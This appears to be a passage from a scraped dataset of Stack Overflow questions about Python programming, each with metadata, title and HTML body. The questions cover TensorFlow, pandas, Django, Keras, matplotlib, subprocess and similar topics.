image_reader = tf.WholeFileReader() # Read an entire image file 
_, image_file = image_reader.read(filename_queue)
image = tf.image.decode_png(image_file, channels=3, dtype=tf.uint8, name=""PNGDecompressor"")
image.set_shape([800,400,3])

frac = random.uniform(0.8,1.0)
image = tf.image.central_crop(image, central_fraction = frac) # THIS FAILS
# image = tf.image.central_crop(image, central_fraction = 0.8) # THIS WORKS 

image = tf.image.resize_images(image, [256, 128])
image.set_shape([256,128,3])
image = tf.cast(image, tf.float32) * (1. / 255) - 0.5 # Convert from [0, 255] -&gt; [-0.5, 0.5] floats.
image = tf.image.per_image_whitening(image)
image = tf.image.random_flip_left_right(image, seed=42)
# Start a new session to show example output.
with tf.Session() as sess:
    tf.initialize_all_variables().run()
    coord = tf.train.Coordinator()
    threads = tf.train.start_queue_runners(coord=coord)
    t_image= sess.run([image])
    [...]
    coord.request_stop()
    coord.join(threads)
</code></pre>

<p>Fails with error:</p>

<pre><code>TypeError: Fetch argument 0.9832154064713503 has invalid type &lt;class 'float'&gt;, must be a string or Tensor. (Can not convert a float into a Tensor or Operation.)
</code></pre>
"
40043715,6335499.0,2016-10-14 12:54:49+00:00,2,Remove html after some point in Beautilful Soup,"<p>I have a trouble. My aim is to parse the data until some moment. Then, I want to stop parsing.</p>

<pre><code>        &lt;span itemprop=""address""&gt;
         Some address
        &lt;/span&gt;
        &lt;i class=""fa fa-signal""&gt;
        &lt;/i&gt;
        ...
       &lt;/p&gt;
      &lt;/div&gt;
     &lt;/div&gt;
     &lt;div class=""search_pagination"" id=""pagination""&gt;
      &lt;ul class=""pagination""&gt;
      &lt;/ul&gt;
     &lt;/div&gt;
    &lt;/div&gt;
   &lt;/div&gt;
  &lt;/div&gt;
  &lt;div class=""col-sm-3""&gt;
   &lt;div class=""panel"" itemscope="""" itemtype=""http://schema.org/WPSideBar""&gt;
    &lt;h2 class=""heading_a"" itemprop=""name""&gt;
     Top-10 today
    &lt;/h2&gt; #a lot of tags after that moment
</code></pre>

<p>I want to get all the values from <code>&lt;span itemprop=""address""&gt;</code> (there are a lot of them before) until the moment <code>Top-10 today</code>.</p>
"
39671251,5549921.0,2016-09-24 00:18:02+00:00,2,Translating Python Lists to C++ Arrays,"<p>I'm working on a language interpreter and nearly have the first half complete. I have created my tokens and linked them together into the stream that I am after.</p>

<p>Specifically, a token is:</p>

<pre><code>enum token_type {
    BRACKET_CURLY_LEFT, BRACKET_CURLY_RIGHT,
    BRACKET_ROUND_LEFT, BRACKET_ROUND_RIGHT,
    ARROW_LEFT, ARROW_RIGHT,

    BACKSLASH, FORWARDSLASH,
    INTEGER, DECIMAL, INVALID_NUM,
    ALLOC, CALL,
    FUNCTION, VARIABLE, WORD,
    UNDERSCORE,
    NULL_SYMB
};

class token {
public:
    token(token_type type, const char* value);
    virtual ~token();

    token_type type;
    char* value;
};
</code></pre>

<p>I previously did some interpreter work in Python, where I followed the <a href=""http://norvig.com/lispy.html"" rel=""nofollow""><strong>lis.py</strong></a> and <a href=""http://norvig.com/lispy2.html"" rel=""nofollow""><strong>lispy.py</strong></a> tutorials on making a Lisp interpreter. On the lis.py page, one of the first things Norvig writes, is:</p>

<pre><code>def parse(program):
    ""Read a Scheme expression from a string.""
    return read_from_tokens(tokenize(program))

def read_from_tokens(tokens):
    ""Read an expression from a sequence of tokens.""
    if len(tokens) == 0:
        raise SyntaxError('unexpected EOF while reading')
    token = tokens.pop(0)
    if '(' == token:
        L = []
        while tokens[0] != ')':
            L.append(read_from_tokens(tokens))
        tokens.pop(0) # pop off ')'
        return L
    elif ')' == token:
        raise SyntaxError('unexpected )')
    else:
        return atom(token)

def atom(token):
    ""Numbers become numbers; every other token is a symbol.""
    try: return int(token)
    except ValueError:
        try: return float(token)
        except ValueError:
            return Symbol(token)
</code></pre>

<p>If we look specifically at the <code>read_from_tokens()</code> function, it crawls through the list of tokens and returns both tokens <em>and</em> arrays, which can contain more tokens and more arrays and etc. Each list is essentially simulating the <code>( ... )</code> block.</p>

<p>In my C++ program, I'm trying to emulate this, by sorting my tokens into arrays which will simulate the <code>{ ... }</code> block. Now if we look at the Python array, <code>L = []</code>, it can store practically any data type. A C++ <code>std::vector</code> cannot. However it <em>can</em> store <code>(void*)</code>.</p>

<p>So I went off and tried creating a translation by having the functions return type as a void pointer, and then return both <code>token</code>s and <code>std::vector&lt;token&gt;</code>s. However I ended up getting a bloated allocation error, probably due to the casting I do.</p>

<p>This is perhaps the dirtiest piece of code I will ever write...</p>

<pre><code>void* group_tokens(std::vector&lt;token&gt; tokens) {
    token tok = tokens.at(0);
    tokens.erase(tokens.begin());
    if (tok.value == ""{"") {
        std::vector&lt;token&gt; group_arr;
        int i = 0;
        while ((tokens.at(i).value != "")"")) {
            std::vector&lt;token&gt;* crawled_arr = (std::vector&lt;token&gt;*) group_tokens(tokens);
            group_arr.insert(group_arr.end(), crawled_arr-&gt;begin(), crawled_arr-&gt;end());
            i++;
        }
        tokens.erase(tokens.begin());
        return static_cast&lt;void*&gt;(&amp;group_arr);
    } else {
        return static_cast&lt;void*&gt;(&amp;tok);
    }
}
</code></pre>

<p>I skipped over translating the errors, because I write a ""perfect"" program that should not create any errors: <code>{ test }</code>. This then results in allocation errors.</p>

<p>So to sum up, is there a way I can possibly translate these ""any value-taking"" Python lists into a C++ array which I can grab both <code>std::vector&lt;token&gt;</code>s from as well as <code>token</code>s that works on an ""executable"" basis as well as a ""compiling"" basis albeit I am swimming in warnings?</p>

<p>If the question is viewed as too closed and narrow, to broaden it, the question can be viewed as, ""How can I write a Python list as an array in C++ that takes vectors of objects and singular objects.</p>
"
39723962,2650249.0,2016-09-27 11:53:08+00:00,2,Pass variable from one decorator to another one,"<p>Let's say a customer will pass me the functions of the following structure:
</p>

<pre><code>def atomic():
    pass # implementation unknown
def another_atomic():
    pass # implementation unknown

def composite(): # implementation unknown, but is a sequence of atomic functions
    atomic()
    another_atomic()
    atomic()

def another_composite(): # this is also possible
    if condition:
        atomic()
    for count in range(0, 100):
        another_atomic()
</code></pre>

<p>I need to provide a set of function decorators to the customers to they can annotate their functions. In a ""special"" mode these decorators should collect some metadata like execution time for each atomic step in a composite execution or alter the function execution, like breaking composite execution on first <code>False</code> returned by an atomic step or spawning <code>n</code> threads on start of a composite execution so each atomic step is executed <code>n</code> times in parallel. I'm still playing with possibilities, but one idea I have is to turn the execution of the composite function into collection of all the atomic steps in that function first, initialize the necessary metadata/stats collectors or execution strategies and then execute the atomic step functions in collection order, according to that custom logic.</p>

<p>If I supply the following decorators:</p>

<pre class=""lang-python prettyprint-override""><code>class composite(object):

    def __init__(self, fn):
        self.fn = fn
        self.atomics = []

    def __call__(self, *args, **kwargs):
        self.fn(*args, **kwargs)
        # do something with collected atomic, e.g.
        execs = (atomic(*atomic_args, **atomic_kwargs) for (atomic, atomic_args, atomic_kwargs,) in self.atomics)
        # ...

class atomic(object):

    def __init__(self, fn):
        self.fn = fn

    def __call__(self, *args, **kwargs):
        # is it possible to pass the atomic step to the decorator of the related composite function?
        # like self.realted_composite.atomics.append((fn, args, kwargs,))
</code></pre>
"
39723925,4795243.0,2016-09-27 11:51:01+00:00,2,"How to separate a CSV file when there are """" lines?","<p>When I am reading in a CSV file that looks like this:</p>

<pre><code>To, ,New York ,Norfolk ,Charleston ,Savannah 

Le Havre (Fri), ,15 ,18 ,22 ,24 

Rotterdam (Sun) ,"""",13 ,16 ,20 ,22 

Hamburg (Thu) ,"""",11 ,14 ,18 ,20 

Southampton (Fri) , """" ,8 ,11 ,15 ,17
</code></pre>

<p>using pandas, as follows:</p>

<pre><code>duration_route1 =  pd.read_csv(file_name, sep = ',')
</code></pre>

<p>I get the following result (I use Sublime Text to run my Python code):</p>

<p><a href=""http://i.stack.imgur.com/jO08M.png"" rel=""nofollow""><img src=""http://i.stack.imgur.com/jO08M.png"" alt=""enter image description here""></a></p>

<p>You see that when there is a <code>""""</code>, it doesn't separate the string. Why does it not do this?</p>
"
39723437,1217284.0,2016-09-27 11:25:58+00:00,2,python subprocess: order of output changes when using subprocess.PIPE,"<p>When I write a python script called <code>outer.py</code> containing</p>

<pre><code>p = subprocess.Popen(['./inner.py'])
print('Called inner.py without options, waiting for process...')
p.wait()
print('Waited for inner.py without options')

p = subprocess.Popen(['./inner.py'], stdout=subprocess.PIPE)
print('Called inner.py with PIPE, communicating...')
b_out, b_err = p.communicate()
out = b_out.decode('utf8')
print('out is ""{}""'.format(out))
</code></pre>

<p>And an <code>inner.py</code> containing</p>

<pre><code>print(""inner: Echoing Hallo"")
p = subprocess.Popen(['echo', 'hallo'])
print(""inner: Waiting for Echo to finish..."")
p.wait()
print(""inner: Waited for Echo"")
</code></pre>

<p>I get the following when calling <code>outer.py</code> from a terminal:</p>

<pre><code>Called inner.py without options, waiting for process...
inner: Echoing Hallo
inner: Waiting for Echo to finish...
hallo
inner: Waited for Echo
Waited for inner.py without options

Called inner.py with PIPE, communicating...
out is ""hallo
inner: Echoing Hallo
inner: Waiting for Echo to finish...
inner: Waited for Echo
""
</code></pre>

<p>Why, when calling <code>inner.py</code> with <code>stdout=subprocess.PIPE</code>, does the ""hallo"" appear before the ""inner: Echoing Hallo"" in the captured output?</p>
"
39723061,6117337.0,2016-09-27 11:06:11+00:00,2,How to extract date form data frame column?,"<p>I have data frame like that:</p>

<pre><code>    month       items
0   1962-01-01  589
1   1962-02-01  561
2   1962-03-01  640
3   1962-04-01  656
4   1962-05-01  723
</code></pre>

<p>I need to get year or month from this data frame and create array, but I don't know how to do that.</p>

<p>expected result:</p>

<pre><code>years = [1962, 1962, 1962....]
monthes = [1, 2, 3, 4, 5.....]
</code></pre>

<p>Can you help me?</p>
"
40045159,4031654.0,2016-10-14 14:04:53+00:00,2,Accuracy not high enough for dogs_cats classification dataset using CNN with Keras-Tf python,"<p>Guys I'm trying to classify the Dogs vs Cats dataset using CNN. I'm deep learning beginner btw.</p>

<p>The dataset link can be obtained from <a href=""https://www.kaggle.com/c/dogs-vs-cats/data"" rel=""nofollow"">here</a>. I've also classified the above dataset using MLP with a training accuracy of 70% and testing accuracy of 62%. So I decided to use CNN to improve the score.</p>

<p>But unfortunately, I'm still getting very similar results. Here is my code:</p>

<pre><code>from sklearn.cross_validation import train_test_split
from sklearn.preprocessing import LabelEncoder
from keras.layers import Dense, Activation, Flatten, Dropout
from keras.layers.convolutional import Convolution2D
from keras.layers.convolutional import MaxPooling2D
from keras.models import Sequential
from keras.utils import np_utils
from keras.optimizers import SGD
from keras.datasets import mnist
from keras import backend as K
from imutils import paths
import numpy as np
import argparse
import cPickle
import h5py
import sys
import cv2
import os

K.set_image_dim_ordering('th')

def image_to_feature_vector(image, size=(28, 28)):
    return cv2.resize(image, size)

print(""[INFO] pre-processing images..."")
imagePaths = list(paths.list_images(raw_input('path to dataset: ')))

data   = []
labels = []

for (i, imagePath) in enumerate(imagePaths):
    image = cv2.imread(imagePath)
    label = imagePath.split(os.path.sep)[-1].split(""."")[0]
    features = image_to_feature_vector(image)
    data.append(features)
    labels.append(label)

    if i &gt; 0 and i % 1000 == 0:
        print(""[INFO] processed {}/{}"".format(i, len(imagePaths)))

le     = LabelEncoder()
labels = le.fit_transform(labels)
labels = np_utils.to_categorical(labels, 2)
data   = np.array(data) / 255.0

print(""[INFO] constructing training/testing split..."")
(X_train, X_test, y_train, y_test) = train_test_split(data, labels, test_size=0.25, random_state=42)

X_train = X_train.reshape(X_train.shape[0], 3, 28, 28).astype('float32')
X_test  = X_test.reshape(X_test.shape[0], 3, 28, 28).astype('float32')
num_classes = y_test.shape[1]

def basic_model():
    model = Sequential()
    model.add(Convolution2D(32, 3, 3, border_mode='valid', init='uniform', bias=True, input_shape=(3, 28, 28), activation='relu'))
    model.add(MaxPooling2D(pool_size=(2, 2)))
    model.add(Dropout(0.25))
    model.add(Flatten())
    model.add(Dense(128, activation='relu'))
    model.add(Dense(num_classes, activation='softmax'))

    sgd = SGD(lr=0.01, decay=1e-6, momentum=0.9, nesterov=True)
    model.compile(loss='categorical_crossentropy', optimizer=sgd, metrics=['accuracy'])
    return model

model = basic_model()

model.fit(X_train, y_train, validation_data=(X_test, y_test), nb_epoch=25, batch_size=50, shuffle=True, verbose=1)

print('[INFO] Evaluating the model on test data...')
scores = model.evaluate(X_test, y_test, batch_size=100, verbose=1)
print(""\nAccuracy: %.4f%%\n\n""%(scores[1]*100))
</code></pre>

<p>The CNN model I've used is very basic but decent enough I think. I followed various tutorials to get to it. I even used this architecture but got similar result(65% testing accuracy):</p>

<pre><code>def baseline_model():
    model = Sequential()
    model.add(Convolution2D(30, 5, 5, border_mode='valid', input_shape=(3, 28, 28), activation='relu'))
    model.add(MaxPooling2D(pool_size=(2, 2)))
    model.add(Convolution2D(15, 3, 3, activation='relu'))
    model.add(MaxPooling2D(pool_size=(2, 2)))
    model.add(Dropout(0.2))
    model.add(Flatten())
    model.add(Dense(128, activation='relu'))
    model.add(Dense(50, activation='relu'))
    model.add(Dense(num_classes, activation='softmax'))

    sgd = SGD(lr=0.01, decay=1e-6, momentum=0.9, nesterov=True)
    model.compile(loss='binary_crossentropy', optimizer=sgd, metrics=['accuracy'])
    return model
</code></pre>

<p>For optimiser I also tried <code>adam</code> with default parameters and for <code>model.complie</code> loss function I also tried <code>categorical_crossentropy</code> but there was no (or very slight) improvement.</p>

<p>Can you suggest where I'm going wrong or what I can do to improve efficiency?(In few epochs if possible)</p>

<p>(I'm a beginner in deep learning and keras programming...)</p>

<p>EDIT: so I managed to touch 70.224% testing accuracy and 74.27% training accuracy. CNN architecture was
<code>CONV =&gt; CONV =&gt; POOL =&gt; DROPOUT =&gt; FLATTEN =&gt; DENSE*3</code></p>

<p>(There is almost no overfitting as training acc: 74% and testing is: 70% í ½í¹)</p>

<p>But still open to suggestions to increase it further, 70% is definitely on lower side...</p>
"
39718576,6676743.0,2016-09-27 07:25:40+00:00,2,Convert a byte array to single bits in a array [Python 3.5],"<p>I am looking for a operation witch converts my byte array:</p>

<pre><code>mem = b'\x01\x02\xff'
</code></pre>

<p>in something like this:</p>

<pre><code>[ [0 0 0 0 0 0 0 1]
  [0 0 0 0 0 0 1 0]
  [1 1 1 1 1 1 1 1] ]
</code></pre>

<p>These are operations that I tried:</p>

<pre><code>import numpy as np

mem = b'\x01\x02\xff' #define my input
mem = np.fromstring(mem, dtype=np.uint8) #first convert to int

#print(mem) give me ""[  1   2 255]"" at this piont

mem = np.array(['{0:08b}'.format(mem[b]) for b in mem]) #now convert to bin
data= np.array([list(mem[b]) for b in mem]) #finally convert to single bits

print(data)
</code></pre>

<p>This code will crash at line 4.. <code>IndexError: index 255 is out of bounds for axis 0 with size 9</code>
Otherwise, it crash at line 5.. <code>IndexError: too many indices for array</code></p>

<p><strong>These are my Questions:</strong></p>

<p>Why are the number of spaces different after the conversion from hex to int?</p>

<p>Is that the reason that my next conversion from int to bin failed?</p>

<p>Finally, what is wrong with my <code>list</code> operation?</p>

<p>Thank you for your help! :)</p>
"
39722310,3362518.0,2016-09-27 10:28:56+00:00,2,How to disable sorting by primary key in Django Admin?,"<p>Django admin sorts by primary key <strong>in addition to</strong> sorting fields specified in the model ""ordering"" record, thus, making it necessary to have composite indexes on a model just to allow sorting, which can be very prohibitive on a moderate amount of data(~5 000 000 records)</p>

<p>This is a default behaviour of Django Admin selecting query</p>

<pre><code>SELECT * FROM `book` ORDER BY `book`.`added_at` ASC, `book`.`book_id` DESC LIMIT 100
</code></pre>

<p>I want to achieve the following behaviour</p>

<pre><code> SELECT * FROM `book` ORDER BY `book`.`added_at` ASC LIMIT 100
</code></pre>
"
39721800,5946185.0,2016-09-27 10:04:08+00:00,2,Convert Pandas dataframe to Dask dataframe,"<p>Suppose I have pandas dataframe as:</p>

<pre><code>df=pd.DataFrame({'a':[1,2,3],'b':[4,5,6]})
</code></pre>

<p>When I convert it into dask dataframe what should <code>name</code> and <code>divisions</code> parameter consist of:</p>

<pre><code>from dask import dataframe as dd 
sd=dd.DataFrame(df.to_dict(),divisions=1,meta=pd.DataFrame(columns=df.columns,index=df.index))
</code></pre>

<blockquote>
  <p>TypeError: <strong>init</strong>() missing 1 required positional argument: 'name'</p>
</blockquote>

<p><strong>Edit</strong> :
Suppose I create a pandas dataframe like:</p>

<pre><code>pd.DataFrame({'a':[1,2,3],'b':[4,5,6]})
</code></pre>

<p>Similarly how to create dask dataframe as it needs three additional arguments as <code>name,divisions</code> and <code>meta</code>.</p>

<pre><code>sd=dd.Dataframe({'a':[1,2,3],'b':[4,5,6]},name=,meta=,divisions=)
</code></pre>

<p>Thank you for your reply.</p>
"
39720919,3337426.0,2016-09-27 09:23:59+00:00,2,"TypeError: initial_value must be unicode or None, not str,","<p>I am using SOAPpy for soap wsdl services. I am following this <a href=""http://www.diveintopython.net/soap_web_services/introspection.html"" rel=""nofollow"">toturail</a>. My code is as follow </p>

<pre><code>from SOAPpy import WSDL
wsdlfile = 'http://track.tcs.com.pk/trackingaccount/track.asmx?WSDL'
server = WSDL.Proxy(wsdlfile)
</code></pre>

<p>I am getting this error on the last line of my code</p>

<pre><code>Traceback (most recent call last):
File ""&lt;console&gt;"", line 1, in &lt;module&gt;
File ""/home/adil/Code/mezino/RoyalTag/royalenv/local/lib/python2.7/site-packages/SOAPpy/WSDL.py"", line 85, in __init__
self.wsdl = reader.loadFromString(str(wsdlsource))
File ""/home/adil/Code/mezino/RoyalTag/royalenv/local/lib/python2.7/site-packages/wstools/WSDLTools.py"", line 52, in loadFromString
return self.loadFromStream(StringIO(data))
TypeError: initial_value must be unicode or None, not str
</code></pre>

<p>I tried to convert the string into utf using </p>

<pre><code>wsdlFile = unicode('http://track.tcs.com.pk/trackingaccount/track.asmx?WSDL, ""utf-8"")
</code></pre>

<p>but still having same error. What is missing here ?</p>
"
40076618,7028418.0,2016-10-16 23:28:05+00:00,2,I write this code of Simulated Annealing for TSP and I have been trying all day to debug it but something goes wrong,"<p>This code suppose to reduce the distance of initial tour: distan(initial_tour) &lt; distan(best) . Can you help me plz? I 've been trying all day now. <strong>Do I need to change my swapping method?</strong>
Something goes wrong and the simulated annealing does'not work:</p>

<pre><code>def prob(currentDistance,neighbourDistance,temp):

    if neighbourDistance &lt; currentDistance:
       return 1.0

    else:
       return math.exp( (currentDistance - neighbourDistance) / temp)


def distan(solution):

    #gives the distance of solution


    listax, listay = [], []
    for i in range(len(solution)):

       listax.append(solution[i].x)
       listay.append(solution[i].y)

    dists = np.linalg.norm(np.vstack([np.diff(np.array(listax)), np.diff(np.array(listay))]), axis=0)
    cumsum_dist = np.cumsum(dists)

    return cumsum_dist[-1]


#simulated annealing

temp = 1000000

#creating initial tour

shuffle(greedys)

initial_tour=greedys


print (distan(initial_tour))

current_best = initial_tour

best = current_best

while(temp &gt;1 ):

    #create new neighbour tour 

    new_solution= current_best 

    #Get a random positions in the neighbour tour

    tourPos1=random.randrange(0, len(dfar))
    tourPos2=random.randrange(0, len(dfar))

    tourCity1=new_solution[tourPos1]
    tourCity2=new_solution[tourPos2]

    #swapping
    new_solution[tourPos1]=tourCity2
    new_solution[tourPos2]=tourCity1

    #get distance of both current_best and its neighbour 

    currentDistance = distan(current_best)

    neighbourDistance = distan(new_solution)


    # decide if we should accept the neighbour
    # random.random() returns a number in [0,1)

    if prob(currentDistance,neighbourDistance,temp) &gt; random.random():

        current_best = new_solution 

    # keep track of the best solution found  

    if distan(current_best) &lt;  distan(best):

        best = current_best

    #Cool system

    temp = temp*0.99995


print(distan(best)) 
</code></pre>
"
39719709,353337.0,2016-09-27 08:25:57+00:00,2,retrieve full geometry grid information from matplotlib subplots,"<p>Consider</p>



<pre><code>import numpy as np
import matplotlib.pyplot as plt

data = np.zeros((3, 3))

fig = plt.figure()

ax1 = plt.subplot(131)
ax2 = plt.subplot(132)
ax3 = plt.subplot(133)
axes = [ax1, ax2, ax3]

for ax in axes:
    im = ax.imshow(data)
</code></pre>

<p>The resulting figure <code>fig</code> has 3 <code>AxesSubplot</code> children, one for each subplot. Their geometry</p>



<pre><code>for child in fig.get_children():
    try:
        print(child.get_geometry())
    except AttributeError:
        pass
</code></pre>



<pre><code>(1, 3, 1)
(1, 3, 2)
(1, 3, 3)
</code></pre>

<p>makes sense.</p>

<p>Now let's add some color bars:</p>



<pre><code>for ax in axes:
    fig.colorbar(im, ax=ax, orientation='horizontal')
</code></pre>

<p><em>Now</em> the geometries are reported as</p>



<pre><code>(2, 1, 1)
(2, 1, 1)
(2, 1, 1)
(1, 3, 2)
(1, 3, 2)
(1, 3, 2)
</code></pre>

<p>Hm, how to make sense of those?</p>
"
40076616,741099.0,2016-10-16 23:27:40+00:00,2,iPython magic for Zipline cannot find data bundle,"<p>I have a Python 2.7 script that runs Zipline fine on the command prompt, using <code>--bundle=myBundle</code> to load the custom data bundle <code>myBundle</code> which I have registered using <code>extension.py</code>.</p>

<pre><code>zipline run -f myAlgo.py --bundle=myBundle --start 2016-6-1 --end 2016-7-1 --data-frequency=minute
</code></pre>

<p><strong>Problem:</strong> However when I try to use the <code>%zipline</code> IPython magic to run the algorithm, the bundle argument <code>--bundle</code> seems to have difficulty finding <code>myBundle</code>.</p>

<pre><code>%zipline --bundle=myBundle--start 2016-6-1 --end 2016-7-1 --data-frequency=minute
</code></pre>

<p>Running this will give the error</p>

<pre><code>UnknownBundle: No bundle registered with the name u'myBundle'
</code></pre>

<p>Do we have to register the bundle differently when using IPython notebook?</p>
"
40046952,7020034.0,2016-10-14 15:33:10+00:00,2,What is the difference between installing python from the website and using brew?,"<p>I have a Mac with OSX 10.11.6. I used brew to install python3. It installed python 3.5.2, but I need python 3.5.1. I've been googling, but can't figure out how I would install 3.5.1 via brew. So I went to python.org and downloaded the python-3.5.1-macosx10.6.pkg. I searched for how installing python this way would differ from installing it via brew, but couldn't find any answers. </p>

<p>So, it is possible to brew install python 3.5.1? If not, what will it mean to install 3.5.1 via .pkg file?</p>
"
39671786,1664409.0,2016-09-24 02:00:21+00:00,2,How to prevent Django Rest Framework from validating the token if 'AllowAny' permission class is used?,"<p>Let me show you my code first:</p>

<p>In <code>settings.py</code></p>

<pre><code>....
DEFAULT_AUTHENTICATION_CLASSES': (
    'rest_framework.authentication.TokenAuthentication',
),
'DEFAULT_PERMISSION_CLASSES': (
    'rest_framework.permissions.IsAuthenticated',
)
....
</code></pre>

<p>My <code>my_view.py</code>:</p>

<pre><code>@api_view(['POST'])
@permission_classes((AllowAny,))
def say_hello(request):
    return Response(""hello"")
</code></pre>

<p>As you can see, I'm using Token Authentication to protect my other API's by default, but <strong>when I add a token header</strong> in <code>say_hello</code>, Django Rest Framework will also check if the token is valid or not, even when i add <code>AllowAny</code> permission class.</p>

<p><strong>My question is</strong> how to make Django Rest Framework ignore checking the token if the token header is present in the <code>say_hello</code>?
and are there any security considerations for making this?</p>

<p>Thanks.</p>
"
40047029,6916524.0,2016-10-14 15:36:44+00:00,2,What type of data that is separated by \ and is in hex?,"<p>I have a data set that is pulled from a pixhawk. I am trying to parse this data and plot some of them vs time. The issue is when I use this code to open one of the bin files:</p>

<pre><code>with open(""px4log.bin"", ""rb"") as binary_file:
    # Read the whole file at once
    data = binary_file.read()
    print(data)
</code></pre>

<p>I get data that looks like this:</p>

<pre><code>b'\xa3\x95\x80\x80YFMT\x00BBnNZ\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00Type,Length,Name,Format,Columns\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa3\x95\x80\x81\x17PARMNf\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00Name,Value\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa3\x95\x80\x82-GPS\x00BIHBcLLeeEefI\x00\x00\x00Status,TimeMS,Week,NSats,HDop,Lat,Lng,RelAlt,Alt,Spd,GCrs,VZ,T\x00\x00\xa3\x95\x80\x83\x1fIMU\x00Iffffff\x00\x00\x00\x00\x00\x00\x00\x00\x00TimeMS,GyrX,GyrY,GyrZ,AccX,AccY,AccZ\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0
</code></pre>

<p>I was told it is supposed to be in binary, but it's not. Unless python is doing something to the data set when it is opening it?</p>

<p>You can download this sample data set if you would from:</p>

<pre><code>https://pixhawk.org/_media/downloads/px4log_sample_1.px4log.zip
</code></pre>
"
39756947,6237702.0,2016-09-28 20:21:28+00:00,2,How to check HTTP errors for more than two URLs?,"<p><strong><em>Question: I've 3 URLS - testurl1, testurl2 and testurl3. I'd like to try testurl1 first, if I get 404 error then try testurl2, if that gets 404 error then try testurl3. How to achieve this? So far I've tried below but that works only for two url, how to add support for third url?</em></strong></p>

<pre><code>from urllib2 import Request, urlopen
from urllib2 import URLError, HTTPError

def checkfiles():
    req = Request('http://testurl1')
    try:
        response = urlopen(req)
        url1=('http://testurl1')

    except HTTPError, URLError:
        url1 = ('http://testurl2')

    print url1
    finalURL='wget '+url1+'/testfile.tgz'

    print finalURL

checkfiles()
</code></pre>
"
40000718,4263878.0,2016-10-12 14:04:31+00:00,2,python pandas-possible to compare 3 dfs of same shape using where(max())? is this a masking issue?,"<p>I have a dict containing 3 dataframes of identical shape. I would like to create:</p>

<ol>
<li>a 4th dataframe which identifies the largest value from the original 3 at each coordinate - so dic['four'].ix[0,'A'] = MAX( dic['one'].ix[0,'A'], dic['two'].ix[0,'A'], dic['three'].ix[0,'A'] )</li>
<li><p>a 5th with the second largest value</p>

<pre><code>dic = {}
for i in ['one','two','three']:
    dic[i] = pd.DataFrame(np.random.randint(0,100,size=(10,3)), columns=list('ABC'))
</code></pre></li>
</ol>

<p>I cannot figure out how to use .where() to compare the original 3 dfs. Looping through would be inefficient for ultimate data set. </p>
"
39757188,5134930.0,2016-09-28 20:35:49+00:00,2,How can I make a python candlestick chart clickable in matplotlib,"<p>I am trying to make a OHLC graph plotted with matplotlib interactive upon the user clicking on a valid point. The data is stored as a pandas dataframe of the form  </p>

<pre><code>index       PX_BID  PX_ASK  PX_LAST  PX_OPEN  PX_HIGH  PX_LOW
2016-07-01  1.1136  1.1137   1.1136   1.1106   1.1169  1.1072
2016-07-04  1.1154  1.1155   1.1154   1.1143   1.1160  1.1098
2016-07-05  1.1076  1.1077   1.1076   1.1154   1.1186  1.1062
2016-07-06  1.1100  1.1101   1.1100   1.1076   1.1112  1.1029
2016-07-07  1.1062  1.1063   1.1063   1.1100   1.1107  1.1053
</code></pre>

<p>I am plotting it with matplotlib's candlestick function:</p>

<pre><code>candlestick2_ohlc(ax1, df['PX_OPEN'],df['PX_HIGH'],df['PX_LOW'],df['PX_LAST'],width=1)
</code></pre>

<p>When plotted it looks somthing like this:</p>

<p><a href=""https://pythonprogramming.net/static/images/matplotlib/candlestick-ohlc-graphs-matplotlib-tutorial.png"" rel=""nofollow"">https://pythonprogramming.net/static/images/matplotlib/candlestick-ohlc-graphs-matplotlib-tutorial.png</a></p>

<p>I want the console to print out the value of the point clicked, the date and whether it is an open, high low or close. So far I have something like:</p>

<pre><code>fig, ax1 = plt.subplots()

ax1.set_title('click on points', picker=True)
ax1.set_ylabel('ylabel', picker=True, bbox=dict(facecolor='red'))
line = candlestick2_ohlc(ax1, df['PX_OPEN'],df['PX_HIGH'],df['PX_LOW'],df['PX_LAST'],width=0.4)

def onpick1(event):
    if isinstance(event.artist, (lineCollection, barCollection)):
        thisline = event.artist
        xdata = thisline.get_xdata()
        ydata = thisline.get_ydata()
        ind = event.ind
        #points = tuple(zip(xdata[ind], ydata[ind]))
        #print('onpick points:', points)
        print( 'X='+str(np.take(xdata, ind)[0]) ) # Print X point
        print( 'Y='+str(np.take(ydata, ind)[0]) ) # Print Y point

fig.canvas.mpl_connect('pick_event', onpick1)
plt.show()
</code></pre>

<p>This code however does not print anything when ran and points are clicked. When I look at examples of interactive matplotlib graphs, they tend to have an argument in the plot function such as:</p>

<pre><code>line, = ax.plot(rand(100), 'o', picker=5)
</code></pre>

<p>However, candlestick2_ohlc does not take a 'picker' arg. Any tips on how I can get around this?</p>

<p>Thanks</p>
"
39949719,6469488.0,2016-10-09 23:55:53+00:00,2,Django: python manage.py makemigrations returns IntegrityError: Column 'content_type_id' cannot be null,"<p>I hooked up my Django project the the MySQL Database, and I am certain that it is actually connected because when I try to makemigrations. I checked MySQL workbench and all my models are synced into the database. However, the problem is when i try to migrate, I get this error. It is complaining that No migrations to apply because mysql.connector.errors.IntegrityError: 1048 (23000): Column 'content_type_id' cannot be null. I am not even sure where content_type_id is coming from because my model doesn't even have that. </p>

<pre><code>Operations to perform:
  Target specific migration: 0001_initial, from bookSell
Running migrations:
  No migrations to apply.
Traceback (most recent call last):
  File ""/Users/JenniferLiu/.virtualenvs/bookSell/lib/python3.5/site-packages/mysql/connector/django/base.py"", line 177, in _execute_wrapper
    return method(query, args)
  File ""/Users/JenniferLiu/.virtualenvs/bookSell/lib/python3.5/site-packages/mysql/connector/cursor.py"", line 515, in execute
    self._handle_result(self._connection.cmd_query(stmt))
  File ""/Users/JenniferLiu/.virtualenvs/bookSell/lib/python3.5/site-packages/mysql/connector/connection.py"", line 488, in cmd_query
    result = self._handle_result(self._send_cmd(ServerCmd.QUERY, query))
  File ""/Users/JenniferLiu/.virtualenvs/bookSell/lib/python3.5/site-packages/mysql/connector/connection.py"", line 395, in _handle_result
    raise errors.get_exception(packet)
